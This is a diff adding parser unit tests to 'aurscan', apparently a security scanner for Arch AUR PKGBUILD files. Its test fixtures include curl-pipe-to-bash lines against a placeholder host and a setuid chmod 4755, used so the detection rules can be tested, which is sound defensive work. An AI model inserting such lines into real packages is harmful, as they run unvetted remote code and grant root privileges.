@@ -5,6 +5,9 @@ from __future__ import annotations
 import sys
 from pathlib import Path
 
+import pytest
+
+from aurscan import parse
 from aurscan.models import Command, Severity
 from aurscan.parse import parse_install_script, parse_pkgbuild
 
@@ -261,6 +264,42 @@ def test_parse_redirects_are_part_of_command_raw() -> None:
     assert install.args == ["-Dm755", "demo", '"$pkgdir/usr/bin/demo"']
 
 
+def test_parse_pipe_with_redirect_populates_in_pipe_to() -> None:
+    source = """\
+package() {
+  curl -s https://example.invalid/a 2>/dev/null | bash
+}
+"""
+    result = parse_pkgbuild(source)
+
+    pkgbuild = result.pkgbuild
+    assert pkgbuild is not None
+    package = pkgbuild.functions["package"]
+    curl = _command(package, "curl -s https://example.invalid/a 2>/dev/null")
+    assert curl.args == ["-s", "https://example.invalid/a"]
+    # The redirect wrapper must not hide the pipe, or R01 would go silent.
+    assert curl.in_pipe_to == "bash"
+    assert _command(package, "bash").in_pipe_to is None
+
+
+def test_parse_declaration_commands_are_captured() -> None:
+    source = """\
+package() {
+  local foo=bar
+  export BAZ=qux
+}
+"""
+    result = parse_pkgbuild(source)
+
+    pkgbuild = result.pkgbuild
+    assert pkgbuild is not None
+    package = pkgbuild.functions["package"]
+    assert [(command.name, command.args) for command in package] == [
+        ("local", ["foo=bar"]),
+        ("export", ["BAZ=qux"]),
+    ]
+
+
 def test_parse_install_script() -> None:
     source = _fixture("install", "basic.install")
 
@@ -318,6 +357,63 @@ def test_parse_install_syntax_error_uses_fallback() -> None:
     assert [command for group in script.functions.values() for command in group] == []
 
 
+def test_parse_syntax_error_with_closed_functions_uses_regex_fallback() -> None:
+    source = """\
+pkgname=fallback-demo
+pkgver=1.0
+source=("$url/broken.tar.gz"
+url=https://example.invalid/fallback
+install=broken.install
+
+package() {
+  install -Dm755 demo "$pkgdir/usr/bin/demo"
+  # comment
+
+  { echo nested; }
+  chmod 4755 "$pkgdir/usr/bin/demo"
+  curl -s https://example.invalid/x | bash
+}
+"""
+    result = parse_pkgbuild(source)
+
+    assert result.parse_failed is True
+    assert [finding.rule_id for finding in result.findings] == ["PARSE-001"]
+    finding = result.findings[0]
+    assert finding.severity == Severity.INFO
+    assert finding.file == "PKGBUILD"
+    assert finding.line is None
+    pkgbuild = result.pkgbuild
+    assert pkgbuild is not None
+    assert pkgbuild.pkgname == ["fallback-demo"]
+    assert pkgbuild.pkgver == "1.0"
+    assert pkgbuild.install == "broken.install"
+    # The fallback output still goes through the usual expansion step.
+    assert pkgbuild.source == ["https://example.invalid/fallback/broken.tar.gz"]
+    assert list(pkgbuild.functions) == ["package"]
+    package = pkgbuild.functions["package"]
+    assert [(command.line, command.name, command.args) for command in package] == [
+        (8, "install", ["-Dm755", "demo", "$pkgdir/usr/bin/demo"]),
+        (12, "chmod", ["4755", "$pkgdir/usr/bin/demo"]),
+        (13, "curl", ["-s", "https://example.invalid/x", "|", "bash"]),
+    ]
+    # The regex path cannot see pipelines: R01/R02 must not be assumed to fire.
+    assert all(command.in_pipe_to is None for command in package)
+
+
+def test_parse_recovers_when_tree_sitter_raises(monkeypatch: pytest.MonkeyPatch) -> None:
+    def _unavailable(*_args: object, **_kwargs: object) -> None:
+        raise RuntimeError("tree-sitter unavailable")
+
+    monkeypatch.setattr(parse, "Parser", _unavailable)
+
+    result = parse_pkgbuild("pkgname=demo\n")
+
+    assert result.parse_failed is True
+    assert [finding.rule_id for finding in result.findings] == ["PARSE-001"]
+    assert result.pkgbuild is not None
+    assert result.pkgbuild.pkgname == ["demo"]
+
+
 def test_parse_benign_fixture_has_no_findings() -> None:
     result = parse_pkgbuild(_fixture("benign", "PKGBUILD"))
 
@@ -331,6 +427,24 @@ def test_parse_empty_source() -> None:
     assert result.pkgbuild is not None
     assert result.pkgbuild.pkgname == []
     assert result.parse_failed is False
+
+
+def test_parse_empty_assignment_yields_empty_value() -> None:
+    result = parse_pkgbuild("FOO=\npkgver=\n")
+
+    pkgbuild = result.pkgbuild
+    assert pkgbuild is not None
+    assert pkgbuild.variables == {"FOO": "", "pkgver": ""}
+    assert pkgbuild.pkgver is None
+
+
+def test_parse_array_assigned_to_scalar_field_takes_first_element() -> None:
+    result = parse_pkgbuild("pkgrel=(1)\nepoch=()\n")
+
+    pkgbuild = result.pkgbuild
+    assert pkgbuild is not None
+    assert pkgbuild.pkgrel == "1"
+    assert pkgbuild.epoch is None
 
 
 def _stack_depth() -> int:
